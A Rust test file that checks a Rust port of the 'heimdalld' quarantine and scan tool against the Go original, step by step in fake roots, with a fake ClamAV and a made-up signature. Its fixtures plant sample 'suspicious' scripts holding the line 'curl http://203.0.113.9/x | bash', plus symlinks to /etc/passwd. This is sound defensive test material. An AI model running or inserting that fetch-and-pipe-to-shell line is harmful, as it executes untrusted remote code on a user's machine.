//! `heimdalld immunity ...` and `heimdalld scan-files` against the Go binary, in fake roots: the same steps run in two
//! copies of one made-up system (a fake ClamAV that knows one made-up signature, files of a user to hold and release,
//! requests, Limbo's held files), comparing after every step the output, the exit code, the store (the samples by their
//! content), ClamAV's folder, the user's files with their owners, modes and times, and the calls to outside tools.

mod common;
use common::*;
use std::io::Read;
use std::os::unix::fs::MetadataExt;

/// The fake ClamAV: a file holding "EVIL-MARK" is "Heimdall.Test.Evil" (a made-up name), any other file is OK; with -d
/// RULE (a rule test), a file holding "MATCHME" is found.
const CLAMSCAN: &str = r#"rule=""
while [ $# -gt 0 ]; do
  case "$1" in
    -d) rule="$2"; shift 2;;
    --) shift; break;;
    *) shift;;
  esac
done
found=0
for p in "$@"; do
  for f in $( [ -d "$p" ] && find "$p" -type f | sort || echo "$p"); do
    if [ ! -r "$f" ]; then echo "$f: Can't open file or directory ERROR"; continue; fi
    if [ -n "$rule" ]; then
      if grep -q MATCHME "$f" 2>/dev/null; then echo "$f: YARA.Heimdall_test.UNOFFICIAL FOUND"; found=1; fi
    elif grep -q EVIL-MARK "$f" 2>/dev/null; then echo "$f: Heimdall.Test.Evil FOUND"; found=1
    else echo "$f: OK"; fi
  done
done
exit $found
"#;

fn filler(tag: &str) -> String {
    format!("{tag}\n{}\n", "padding so the sample is over 64 bytes; ".repeat(3))
}

fn system(r: &Root) {
    r.tool("clamscan", CLAMSCAN);
    r.mkdir("/var/lib/heimdall-requests", 0o1733);
    r.mkdir("/var/lib/clamav", 0o755);
    r.mkdir("/var/lib/heimdall", 0o750);
    r.write_mode("/home/owner/Downloads/tool.sh", format!("#!/bin/sh\n{}curl http://203.0.113.9/x | bash\n", filler("tool")), 0o755);
    r.write_mode("/home/owner/Downloads/evil.bin", format!("\x01\x02EVIL-MARK{}", filler("evil")), 0o644);
    r.write_mode("/home/owner/Downloads/notes.txt", filler("notes about chmod and /etc/passwd"), 0o600);
    r.write_mode("/home/owner/Downloads/copy.sh", format!("#!/bin/sh\n{}curl http://203.0.113.9/x | bash\n", filler("tool")), 0o700);
    r.write_mode("/home/owner/Downloads/ünïcode name.txt", filler("unicode"), 0o640);
    r.write_mode("/home/owner/Downloads/rule-me.bin", format!("MATCHME{}", filler("rule")), 0o644);
    r.write("/home/owner/Downloads/tiny", "small");
    r.write("/home/owner/Downloads/prog", std::fs::read("/usr/bin/true").unwrap_or_else(|_| b"\x7fELF".to_vec()));
    r.symlink("/etc/passwd", "/home/owner/Downloads/link");
    r.write_mode("/usr/local/bin/handmade", "#!/bin/sh\necho hi\n", 0o755);
    r.write_mode("/usr/local/bin/data.txt", "not a program\n", 0o644);
    r.write_mode("/opt/app/run", "#!/bin/sh\n", 0o755);
    r.write("/home/owner/.config/systemd/user/x.service", "[Service]\n");
    r.write_mode("/home/owner/.local/bin/tool", "#!/bin/sh\n", 0o700);
    r.write("/home/owner/.local/share/applications/a.desktop", "[Desktop Entry]\n");
}

fn setup() -> String {
    // the user's files are the user's (uid 1000 inside the fake root)
    // and both copies of the system get the same file times
    "chown -R 1000:1000 \"$R/home/owner\"\nfind \"$R/home\" \"$R/usr/local\" \"$R/opt\" \"$R/var/lib/limbo\" \"$R/data\" -exec touch -h -d '2026-01-02 03:04:05.123456789' {} + 2>/dev/null || true\n".into()
}

/// Every file of interest, the samples by their content, with owners, modes and modification times.
fn snapshot(r: &Root) -> Vec<(String, String)> {
    let mut out = Vec::new();
    for (k, v) in r.tree(&[
        "/var/lib/heimdall-immunity",
        "/var/lib/clamav",
        "/home/owner",
        "/var/lib/heimdall-requests",
        "/var/lib/heimdall",
        "/var/lib/limbo",
    ]) {
        let h = r.host(&k);
        let m = std::fs::symlink_metadata(&h).ok();
        let meta = m
            .map(|m| format!("{}:{} mt={}", m.uid(), m.gid(), if m.is_file() { m.mtime().to_string() } else { "-".into() }))
            .unwrap_or_default();
        let v = if k.ends_with(".gz") {
            let mut b = Vec::new();
            let _ = flate2::read::MultiGzDecoder::new(std::fs::File::open(&h).unwrap()).read_to_end(&mut b);
            format!("{} gz of {} bytes {}", &v[..v.find(' ').unwrap_or(0)], b.len(), String::from_utf8_lossy(&b[..b.len().min(40)]))
        } else if k.contains("/var/lib/heimdall-immunity/") || k.ends_with("rule-drafts.json") {
            clean(&v)
        } else {
            v
        };
        // the restored files keep their times; the store's own files are new each run
        let meta = if k.starts_with("/home/") { meta } else { meta.split(" mt=").next().unwrap_or("").to_string() };
        out.push((k, format!("{v} [{meta}]")));
    }
    out
}

fn clean(s: &str) -> String {
    {
        let s = normalize(s);
        // a temporary folder's random name, a scan's duration
        let mut out = s.clone();
        for pre in ["heimdall-immunity-", "heimdall-rule-"] {
            let mut from = 0;
            while let Some(i) = out[from..].find(pre) {
                let at = from + i + pre.len();
                let n = out[at..].chars().take_while(|c| c.is_ascii_digit()).count();
                if n > 0 {
                    out.replace_range(at..at + n, "N");
                }
                from = at;
            }
        }
        // a rule draft's random id
        for pre in ["draft ", "rule test ", "\"id\": \""] {
            let mut from = 0;
            while let Some(i) = out[from..].find(pre) {
                let at = from + i + pre.len();
                let hex = out[at..].chars().take_while(|c| c.is_ascii_hexdigit()).count();
                if hex == 8 {
                    out.replace_range(at..at + 8, "ID");
                }
                from = at;
            }
        }
        if let Some(i) = out.find(" files in ") {
            if let Some(j) = out[i..].find(':') {
                out.replace_range(i + 10..i + j, "D");
            }
        }
        out
    }
}

fn norm(o: &Out) -> Out {
    Out { code: o.code, stdout: clean(&o.stdout), stderr: clean(&o.stderr) }
}

struct Pair {
    go: std::path::PathBuf,
    rg: Root,
    rr: Root,
}

impl Pair {
    fn new(test: &str, build: impl Fn(&Root)) -> Option<Pair> {
        let go = go_or_skip(test)?;
        let (rg, rr) = (Root::new(&format!("{test}-go")), Root::new(&format!("{test}-rs")));
        build(&rg);
        build(&rr);
        // the setup runs once per root, through a harmless command
        let o = Opts { setup: setup(), ..Opts::default() };
        rg.run(&go, &["version"], &o);
        rr.run(&rust_bin(), &["version"], &o);
        Some(Pair { go, rg, rr })
    }
    fn step(&self, args: &[&str], o: &Opts) -> (Out, Out) {
        // the store keeps the newest first by the second an entry was added: a step that adds one starts in a new second,
        // so the order is the same in both copies however loaded the computer is
        if matches!(args.get(1).copied(), Some("hold" | "add" | "suspect" | "take-limbo" | "run-requests")) {
            let ms = (std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_millis() % 1000) as u64;
            std::thread::sleep(std::time::Duration::from_millis(1010 - ms.min(1000)));
        }
        let g = norm(&self.rg.run(&self.go, args, o));
        let r = norm(&self.rr.run(&rust_bin(), args, o));
        assert_same(&format!("{args:?}"), &g, &r);
        let (a, b): (std::collections::BTreeMap<_, _>, std::collections::BTreeMap<_, _>) =
            (snapshot(&self.rg).into_iter().collect(), snapshot(&self.rr).into_iter().collect());
        let diff: Vec<String> = a
            .keys()
            .chain(b.keys())
            .collect::<std::collections::BTreeSet<_>>()
            .into_iter()
            .filter(|k| a.get(*k) != b.get(*k))
            .map(|k| format!("{k}\n  Go:   {:.600}\n  Rust: {:.600}", format!("{:?}", a.get(k)), format!("{:?}", b.get(k))))
            .collect();
        assert!(diff.is_empty(), "{args:?}: files differ:\n{}", diff.join("\n"));
        assert_eq!(clean(&self.rg.calls()), clean(&self.rr.calls()), "{args:?}: tools called differ");
        (g, r)
    }
    /// The SHA-256 of a sample (the store's index read from the Go root).
    fn sha(&self, original: &str) -> String {
        let idx = self.rg.read_str("/var/lib/heimdall-immunity/immunity.json");
        let v: serde_json::Value = serde_json::from_str(&idx).unwrap();
        v.as_array().unwrap().iter().find(|e| e["original"] == original).map(|e| e["sha256"].as_str().unwrap().to_string()).unwrap()
    }
}

fn sha_of(b: &[u8]) -> String {
    use sha2::Digest;
    sha2::Sha256::digest(b).iter().map(|x| format!("{x:02x}")).collect()
}

#[test]
fn immunity_hold_confirm_release_forget_as_go() {
    let Some(p) = Pair::new("imm", system) else { return };
    let root = Opts::default();
    let user = Opts::user();
    for args in [
        &["immunity"][..],
        &["immunity", "nope"],
        &["immunity", "release"],
        &["immunity", "hold", "--reason", " ", "/x"],
        &["immunity", "list"],
    ] {
        p.step(args, &root);
    }
    p.step(&["immunity", "list", "--json"], &root);
    p.step(&["immunity", "list"], &user);
    p.step(&["immunity", "hold", "--reason", "x", "/home/owner/Downloads/tool.sh"], &user);
    p.step(&["immunity", "hold", "--reason", "odd   download\nfrom a mail", "/home/owner/Downloads/tool.sh"], &root);
    p.step(&["immunity", "hold", "--reason", "evil", "/home/owner/Downloads/evil.bin"], &root);
    p.step(&["immunity", "hold", "--reason", "the same again", "/home/owner/Downloads/copy.sh"], &root);
    p.step(&["immunity", "hold", "--reason", "x", "/home/owner/Downloads/tiny"], &root);
    p.step(&["immunity", "hold", "--reason", "x", "/home/owner/Downloads/link"], &root);
    p.step(&["immunity", "hold", "--reason", "x", "/home/owner/Downloads/missing"], &root);
    p.step(&["immunity", "hold", "--reason", "x", "/usr/bin/true"], &root);
    p.step(&["immunity", "hold", "--reason", "a name", "/home/owner/Downloads/ünïcode name.txt"], &root);
    p.step(&["immunity", "add", "--reason", "a program", "/home/owner/Downloads/prog"], &root);
    p.step(&["immunity", "suspect", "--reason", "keep it", "/home/owner/Downloads/notes.txt"], &root);
    p.step(&["immunity", "list"], &root);
    p.step(&["immunity", "list", "--json"], &root);
    let tool = p.sha("/home/owner/Downloads/tool.sh");
    let evil = p.sha("/home/owner/Downloads/evil.bin");
    let notes = p.sha("/home/owner/Downloads/notes.txt");
    let uni = p.sha("/home/owner/Downloads/ünïcode name.txt");
    p.step(&["immunity", "check", "/home/owner/Downloads/rule-me.bin"], &user);
    p.step(&["immunity", "check", "/nowhere"], &user);
    let (g, _) = p.step(&["immunity", "confirm", &tool[..12]], &root);
    assert!(g.stdout.starts_with("learned: every scan now reports a copy of it as Heimdall.Immunity.Script."), "{g:?}");
    p.step(&["immunity", "confirm", "0000"], &root);
    p.step(&["immunity", "confirm", "ffffffffffff"], &root);
    p.step(&["immunity", "release", &evil], &root);
    p.step(&["immunity", "release", &notes], &root);
    let (g, _) = p.step(&["immunity", "release", &uni], &root);
    assert_eq!(g.stdout, "released: /home/owner/Downloads/ünïcode name.txt\n");
    p.step(&["immunity", "release", &uni], &root);
    p.step(&["immunity", "release-if-proven", &tool], &root);
    p.step(&["immunity", "forget", &tool], &root);
    p.step(&["immunity", "forget", &tool], &root);
    p.step(&["immunity", "export"], &root);
    p.step(&["immunity", "list"], &root.clone().env("TZ", "Pacific/Auckland"));
}

/// Not 1:1 on purpose: Go cannot write a name above U+00FF into a sample's gzip header and keeps a broken sample (nothing
/// can be read back, so the file could never be released); the port keeps a good sample without the name.
#[test]
fn a_name_go_cannot_write_into_gzip_keeps_a_good_sample() {
    let build = |r: &Root| {
        system(r);
        r.write_mode("/home/owner/Downloads/smile ☺.txt", filler("smile"), 0o644);
    };
    let Some(p) = Pair::new("imm-name", build) else { return };
    let args = ["immunity", "hold", "--reason", "x", "/home/owner/Downloads/smile ☺.txt"];
    let (g, r) = (p.rg.run(&p.go, &args, &Opts::default()), p.rr.run(&rust_bin(), &args, &Opts::default()));
    assert_eq!((g.code, r.code), (0, 0));
    let sha = p.sha("/home/owner/Downloads/smile ☺.txt");
    let unz = |root: &Root| {
        let mut b = Vec::new();
        let gz = root.read(&format!("/var/lib/heimdall-immunity/samples/{sha}.gz")).unwrap();
        let ok = flate2::read::MultiGzDecoder::new(&gz[..]).read_to_end(&mut b).is_ok();
        (ok, b.len())
    };
    assert_eq!(unz(&p.rg).1, 0, "Go's sample holds nothing");
    assert_eq!(unz(&p.rr), (true, filler("smile").len()));
    let rel = ["immunity", "release", &sha];
    assert_eq!(p.rg.run(&p.go, &rel, &Opts::default()).code, 1, "Go cannot put it back");
    assert_eq!(p.rr.run(&rust_bin(), &rel, &Opts::default()).code, 0, "the port can");
}

#[test]
fn immunity_inventory_requests_and_limbo_as_go() {
    let held = format!("\x7fELF{}", filler("limbo held this"));
    let held_sha = sha_of(held.as_bytes());
    let build = |r: &Root| {
        system(r);
        r.write(&format!("/var/lib/limbo/state/exchange-held/{held_sha}"), &held);
        r.write(
            &format!("/var/lib/limbo/state/exchange-held/{}", "ab".repeat(32)),
            "does not hash to its name, padded past sixty-four bytes......",
        );
    };
    let Some(p) = Pair::new("imm-req", build) else { return };
    let root = Opts::default();
    p.step(&["immunity", "inventory"], &root);
    p.step(&["immunity", "inventory"], &root);
    // the inventory saw the tool two days before it is held: a proof
    let inv = p.rg.read_str("/var/lib/heimdall-immunity/inventory.json");
    let aged = |r: &Root| {
        let two_days_ago = "2026-01-01T00:00:00Z";
        let mut v: serde_json::Value = serde_json::from_str(&inv).unwrap();
        let tool = std::fs::read(r.host("/home/owner/Downloads/tool.sh")).unwrap();
        let m = std::fs::metadata(r.host("/home/owner/Downloads/tool.sh")).unwrap();
        v["/home/owner/Downloads/tool.sh"] = serde_json::json!({"sha256": sha_of(&tool), "size": tool.len(), "mtime": m.mtime() * 1_000_000_000 + m.mtime_nsec(), "first_seen": two_days_ago, "last_seen": two_days_ago});
        r.write("/var/lib/heimdall-immunity/inventory.json", serde_json::to_vec(&v).unwrap());
    };
    aged(&p.rg);
    aged(&p.rr);
    p.step(&["immunity", "hold", "--reason", "x", "/home/owner/Downloads/tool.sh"], &root);
    p.step(&["immunity", "hold", "--reason", "x", "/home/owner/Downloads/notes.txt"], &root);
    let tool = p.sha("/home/owner/Downloads/tool.sh");
    let notes = p.sha("/home/owner/Downloads/notes.txt");
    let req = |r: &Root| {
        r.write("/var/lib/heimdall-requests/a.json", format!(r#"{{"release_if_proven":"{tool}","why":"  it  was\nthere  "}}"#));
        r.write("/var/lib/heimdall-requests/b.json", format!(r#"{{"release_if_proven":"{notes}","why":"please"}}"#));
        r.write("/var/lib/heimdall-requests/c.json", format!(r#"{{"take_limbo":"{held_sha}"}}"#));
        r.write("/var/lib/heimdall-requests/d.json", format!(r#"{{"take_limbo":"{}"}}"#, "ab".repeat(32)));
        r.write("/var/lib/heimdall-requests/e.json", format!(r#"{{"analyze":"{notes}"}}"#));
        r.write("/var/lib/heimdall-requests/f.json", r#"{"release_if_proven":5}"#);
        r.write("/var/lib/heimdall-requests/g.json", "not json");
        r.symlink("/etc/passwd", "/var/lib/heimdall-requests/h.json");
        r.write("/var/lib/heimdall-requests/i/inside", "a folder");
        r.write("/var/lib/heimdall-requests/j.json", r#"{"take_limbo":"NOT-HEX"}"#);
    };
    req(&p.rg);
    req(&p.rr);
    let (g, _) = p.step(&["immunity", "run-requests"], &root);
    assert!(g.stdout.contains("released (proof: exactly this file was on the computer since"), "{g:?}");
    assert!(g.stdout.contains("taken from Limbo: suspect"), "{g:?}");
    assert!(p.rg.host("/home/owner/Downloads/tool.sh").exists(), "the proven file is back");
    p.step(&["immunity", "list"], &root);
    // contained: no release
    for r in [&p.rg, &p.rr] {
        r.write("/etc/heimdall/contained", r#"{"reason":"test"}"#);
        r.write("/var/lib/heimdall-requests/k.json", format!(r#"{{"release_if_proven":"{notes}"}}"#));
    }
    p.step(&["immunity", "run-requests"], &root);
    p.step(&["immunity", "take-limbo", &held_sha], &root);
    p.step(&["immunity", "take-limbo", "nothex"], &root);
    p.step(&["immunity", "take-limbo", &"cd".repeat(32)], &root);
    p.step(&["immunity", "analyze", &notes], &root);
    p.step(&["immunity", "analyze", "zz"], &root);
    p.step(&["immunity", "run-requests"], &Opts::user());
}

#[test]
fn immunity_rules_as_go() {
    let Some(p) = Pair::new("imm-rule", system) else { return };
    let root = Opts::default();
    p.step(&["immunity", "hold", "--reason", "x", "/home/owner/Downloads/rule-me.bin"], &root);
    let sha = p.sha("/home/owner/Downloads/rule-me.bin");
    for r in [&p.rg, &p.rr] {
        r.write("/tmp/good.yar", "rule Heimdall_test {\n  strings: $a = \"MATCHME\"\n  condition: $a\n}\n");
        r.write("/tmp/bad.yar", "import \"pe\"\nrule Heimdall_x { condition: true }\n");
        r.write("/tmp/wide.yar", "rule Heimdall_wide { strings: $a = \"#!\" condition: $a }\n");
        r.mkdir("/tmp/fp", 0o755);
        r.write("/tmp/fp/clean", "nothing here");
        r.write("/tmp/fp2/hit", "MATCHME too");
    }
    p.step(&["immunity", "rule"], &root);
    p.step(&["immunity", "rule", "list"], &root);
    p.step(&["immunity", "rule", "draft", &sha[..10], "/tmp/good.yar"], &Opts::user());
    p.step(&["immunity", "rule", "draft", &sha[..10], "/tmp/good.yar"], &root);
    // the drafts' ids are random: the Rust copy takes the Go copy's, so the steps below name the same draft in both
    let id_of = |r: &Root| {
        let v: serde_json::Value = serde_json::from_str(&r.read_str("/var/lib/heimdall/rule-drafts.json")).unwrap();
        v[0]["id"].as_str().unwrap().to_string()
    };
    let (gid, rid) = (id_of(&p.rg), id_of(&p.rr));
    p.rr.write("/var/lib/heimdall/rule-drafts.json", p.rr.read_str("/var/lib/heimdall/rule-drafts.json").replace(&rid, &gid));
    p.step(&["immunity", "rule", "draft", &sha[..10], "/tmp/bad.yar"], &root);
    p.step(&["immunity", "rule", "draft", "0000000000", "/tmp/good.yar"], &root);
    p.step(&["immunity", "rule", "draft", &sha, "/tmp/missing.yar"], &root);
    p.step(&["immunity", "rule", "list"], &root);
    let drafts = p.rg.read_str("/var/lib/heimdall/rule-drafts.json");
    let v: serde_json::Value = serde_json::from_str(&drafts).unwrap();
    let id = v[0]["id"].as_str().unwrap().to_string();
    p.step(&["immunity", "rule", "show", &id], &root);
    p.step(&["immunity", "rule", "test", &id, "--fp", "/tmp/fp"], &root);
    p.step(&["immunity", "rule", "show", &id], &root);
    p.step(&["immunity", "rule", "test", "--fp", "/tmp/fp2", &id], &root);
    p.step(&["immunity", "rule", "test", "nope"], &root);
    p.step(&["immunity", "rule", "approve", &id], &root);
    p.step(&["immunity", "rule", "reject", &id], &root);
    p.step(&["immunity", "rule", "show", "nope"], &root);
}

#[test]
fn scan_files_as_go() {
    let build = |r: &Root| {
        system(r);
        r.write("/data/a/clean.txt", "fine");
        r.write("/data/a/bad.txt", "EVIL-MARK");
        r.write("/data/b/big.bin", vec![b'x'; 2 << 20]);
        r.write("/data/b/skip/x", "EVIL-MARK");
        r.write("/data/c.tmp", "fine");
        r.write_mode("/data/locked", "EVIL-MARK", 0o000);
        r.symlink("/data/a/bad.txt", "/data/link");
    };
    let Some(p) = Pair::new("scanfiles", build) else { return };
    let user = Opts::user();
    p.step(&["scan-files"], &user);
    p.step(&["scan-files", "--max-mb", "x", "/data"], &user);
    p.step(&["scan-files", "/data"], &Opts::default());
    p.step(&["scan-files", "--state", "/tmp/st.json", "/data", "/nowhere"], &user);
    p.step(&["scan-files", "--state", "/tmp/st.json", "/data"], &user);
    p.step(&["scan-files", "--state", "/tmp/st.json", "--exclude", "/data/b/skip", "--exclude", "*.tmp", "--max-mb", "1", "/data/"], &user);
    p.step(&["scan-files", "--exclude", "[", "--exclude", "", "./data", "/data/a/bad.txt"], &Opts::default());
    for r in [&p.rg, &p.rr] {
        r.write("/var/lib/clamav/heimdall-rule-x.yar", "rule Heimdall_x { condition: false }");
    }
    p.step(&["scan-files", "--state", "/tmp/st.json", "/data"], &user);
    for r in [&p.rg, &p.rr] {
        r.tool("clamscan", "exit 0\n");
    }
    p.step(&["scan-files", "/data/a"], &user);
}
